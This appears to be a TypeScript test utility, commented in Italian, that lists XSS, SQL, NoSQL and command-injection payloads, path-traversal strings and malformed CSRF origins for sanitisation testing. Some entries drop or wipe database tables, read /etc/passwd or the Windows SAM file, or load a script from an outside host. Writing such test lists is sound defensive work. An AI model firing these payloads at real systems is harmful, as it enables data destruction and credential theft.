/**
 * Payload utilities per test di sicurezza
 * Questi payload sono usati per testare vulnerabilità XSS, SQL Injection, ecc.
 */

/**
 * Payload XSS comuni per testare la sanitizzazione
 */
export const xssPayloads = [
  // XSS base
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  
  // XSS con encoding
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  '\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
  
  // XSS con event handlers
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<keygen onfocus=alert("XSS") autofocus>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  
  // XSS con CSS
  '<style>@import\'javascript:alert("XSS")\';</style>',
  '<link rel=stylesheet href=javascript:alert("XSS")>',
  
  // XSS con data URI
  '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
  
  // XSS con SVG
  '<svg><script>alert("XSS")</script></svg>',
  '<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>',
  
  // XSS con escape
  '\';alert("XSS");//',
  '";alert("XSS");//',
  '</script><script>alert("XSS")</script>',
  
  // XSS con HTML entities
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
  
  // XSS con caratteri speciali
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
  
  // XSS con attributi
  '<div onclick="alert(\'XSS\')">Click me</div>',
  '<div style="background:url(\'javascript:alert("XSS")\')">',
  '<div style="expression(alert(\'XSS\'))">',
  
  // XSS complesso
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
  '<script>window["alert"]("XSS")</script>',
  '<script>Function`alert\\x28\\x27XSS\\x27\\x29```</script>',
  
  // XSS con tag alternativi
  '<body style="background:url(\'javascript:alert("XSS")\')">',
  '<table background="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  
  // XSS con doppio encoding
  '%253Cscript%253Ealert("XSS")%253C/script%253E',
  
  // XSS con null bytes
  '<script\x00>alert("XSS")</script>',
  '<script\x0d>alert("XSS")</script>',
  '<script\x0a>alert("XSS")</script>',
]

/**
 * Payload SQL Injection comuni
 */
export const sqlInjectionPayloads = [
  // SQL Injection base
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "') OR ('1'='1--",
  
  // SQL Injection con UNION
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT username,password FROM users--",
  
  // SQL Injection con commenti
  "' OR 1=1; --",
  "' OR 1=1; #",
  "' OR 1=1; /*",
  "' OR 1=1; */ --",
  
  // SQL Injection con funzioni
  "' OR SLEEP(5)--",
  "' OR WAITFOR DELAY '00:00:05'--",
  "' OR pg_sleep(5)--",
  
  // SQL Injection con AND/OR
  "' AND 1=1--",
  "' AND 1=2--",
  "' OR 1=1 AND '1'='1",
  
  // SQL Injection con concatenazione
  "'; DROP TABLE users; --",
  "'; DELETE FROM users; --",
  "'; UPDATE users SET password='hacked' WHERE '1'='1'; --",
  
  // SQL Injection con time-based
  "' OR IF(1=1,SLEEP(5),0)--",
  "' OR CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
  
  // SQL Injection con UNION SELECT
  "' UNION SELECT 1,2,3,4,5--",
  "' UNION ALL SELECT NULL,NULL,NULL--",
  
  // SQL Injection con subquery
  "' OR (SELECT SUBSTRING(@@version,1,1))='5'--",
  "' OR (SELECT COUNT(*) FROM users)>0--",
  
  // SQL Injection con caratteri speciali
  "admin' --",
  "admin'/*",
  "admin' #",
  "admin')/*",
  
  // SQL Injection con encoding
  "%27 OR %271%27=%271",
  "%27 UNION SELECT NULL--",
  
  // SQL Injection con PostgreSQL
  "' OR 1=1; SELECT pg_sleep(5); --",
  "'; SELECT * FROM information_schema.tables; --",
  
  // SQL Injection con MySQL
  "' OR 1=1; SELECT SLEEP(5); --",
  "'; SELECT * FROM mysql.user; --",
  
  // SQL Injection complesso
  "' UNION SELECT NULL,NULL,NULL,NULL WHERE 1=1 OR 1=1--",
  "' OR '1'='1' UNION SELECT NULL,NULL,NULL--",
]

/**
 * Payload per testare NoSQL Injection (se applicabile)
 */
export const nosqlInjectionPayloads = [
  // MongoDB injection
  "' || '1'=='1'",
  "' || 1==1 || ''=='",
  "'; return true; var x='",
  "{$ne: null}",
  "{$gt: ''}",
  "{$regex: '.*'}",
  
  // JSON injection
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

/**
 * Payload per testare Command Injection
 */
export const commandInjectionPayloads = [
  '; ls',
  '; cat /etc/passwd',
  '| ls',
  '| cat /etc/passwd',
  '&& ls',
  '&& cat /etc/passwd',
  '|| ls',
  '$(ls)',
  '`ls`',
  '$(cat /etc/passwd)',
  '`cat /etc/passwd`',
  '; ping -c 4 127.0.0.1',
  '| ping -c 4 127.0.0.1',
]

/**
 * Payload per testare Path Traversal
 */
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '../../../../etc/passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '%252e%252e%252fetc%252fpasswd',
]

/**
 * Payload per testare CSRF
 */
export const csrfPayloads = [
  // Origin headers malformati
  'http://evil.com',
  'https://evil.com',
  'null',
  'null.null',
  
  // Referer headers malformati
  'http://evil.com/',
  'https://evil.com/',
  'about:blank',
]

/**
 * Utility per generare payload con encoding diversi
 */
export function encodePayload(payload: string, encoding: 'url' | 'html' | 'hex' | 'unicode' = 'url'): string {
  switch (encoding) {
    case 'url':
      return encodeURIComponent(payload)
    case 'html':
      return payload
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
    case 'hex':
      return payload.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
    case 'unicode':
      return payload.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('')
    default:
      return payload
  }
}

/**
 * Genera tutte le varianti di un payload con encoding diversi
 */
export function generatePayloadVariants(payload: string): string[] {
  return [
    payload, // Originale
    encodePayload(payload, 'url'),
    encodePayload(payload, 'html'),
    encodePayload(payload, 'hex'),
    encodePayload(payload, 'unicode'),
    payload.toLowerCase(),
    payload.toUpperCase(),
  ]
}


